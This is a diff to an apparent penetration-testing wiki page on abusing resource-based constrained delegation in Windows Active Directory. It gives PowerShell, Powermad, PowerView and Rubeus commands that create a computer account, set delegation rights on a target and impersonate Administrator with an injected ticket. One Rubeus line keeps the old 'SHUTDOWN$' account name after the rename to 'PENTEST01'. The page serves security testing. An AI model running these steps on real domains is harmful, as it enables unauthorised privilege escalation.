@@ -170,47 +170,57 @@ In [some cases](delegations.md#theory), the delegation will not work. Depending 
 {% endtab %}
 
 {% tab title="Windows" %}
-The following command can be used to run network operations as a domain user \(prompt for password\)
+In order to run the following commands and tools as other users, testers can check the [user impersonation](../credentials/impersonation.md) part.
+
+The following command will help testers make sure the controlled domain user can create computer accounts \(`ms-DS-MachineAccountQuota` must be greater than 0, by default it is set to 10\).
 
 ```bash
-runas /netonly /user:$DOMAIN\$USER powershell
-```
-
-Check the domain user we control can create a machine account \(`ms-DS-MachineAccountQuota` &gt; 0, by default it is set to 10\).
-
-```text
 Get-ADDomain | Select-Object -ExpandProperty DistinguishedName | Get-ADObject -Properties 'ms-DS-MachineAccountQuota'
 ```
 
-[Powermad](https://github.com/Kevin-Robertson/Powermad) can be used to create a machine account.
+The module [Powermad](https://github.com/Kevin-Robertson/Powermad)  \(PowerShell\) can be used to create a domain computer account.
 
 ```bash
 Import-Module .\Powermad.ps1
 $password = ConvertTo-SecureString 'SomePassword' -AsPlainText -Force
-New-MachineAccount -machineaccount 'SHUTDOWN' -Password $($password)
+New-MachineAccount -machineaccount 'PENTEST01' -Password $($password)
 ```
 
-The PowerShell Active Directory Module's cmdlets Set-ADComputer and Get-ADComputer can be used to write and read the attributed of an object \(in this case, to modify the delegation rights\).
+The [PowerShell ActiveDirectory module](https://docs.microsoft.com/en-us/powershell/module/addsadministration/?view=win10-ps)'s cmdlets Set-ADComputer and Get-ADComputer can be used to write and read the attributed of an object \(in this case, to modify the delegation rights\).
 
 ```bash
 # Populate the msDS-AllowedToActOnBehalfOfOtherIdentity
-Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount 'SHUTDOWN$'
+Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount 'PENTEST01$'
 
-# Check the populated attribute
+# Read the attribute
 Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount
+```
+
+PowerSploit's [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) module is an alternative that can be used to edit the attribute \([source](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html?highlight=genericall#id31)\).
+
+```bash
+# Obtain the SID of the controlled computer account
+$ComputerSid = Get-DomainComputer 'PENTEST01' -Properties objectsid | Select -Expand objectsid
+
+# Build a generic ACE with the attacker-added computer SID as the pricipal, and get the binary bytes for the new DACL/ACE
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDBytes, 0)
+
+# set SD in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the target comptuer account
+Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
 ```
 
 [Rubeus](https://github.com/GhostPack/Rubeus) can then be used to request the "impersonation TGS" and inject it for later use.
 
 ```bash
-Rubeus.exe s4u /user:SHUTDOWN$ /rc4:$computed_NThash /impersonateuser:Administrator /msdsspn:$Target_SPN /ptt
+Rubeus.exe s4u /user:SHUTDOWN$ /rc4:$NThash /impersonateuser:Administrator /msdsspn:$Target_SPN /ptt
 ```
 
 The NT hash can be computed as follows.
 
 ```bash
-Import-Module .\DSInternals.ps1
-ConvertTo-NTHash $password
+Rubeus.exe hash /password:$password
 ```
 
 Once the ticket is injected, it can natively be used when accessing the service \(see [pass-the-ticket](pass-the-ticket.md)\).
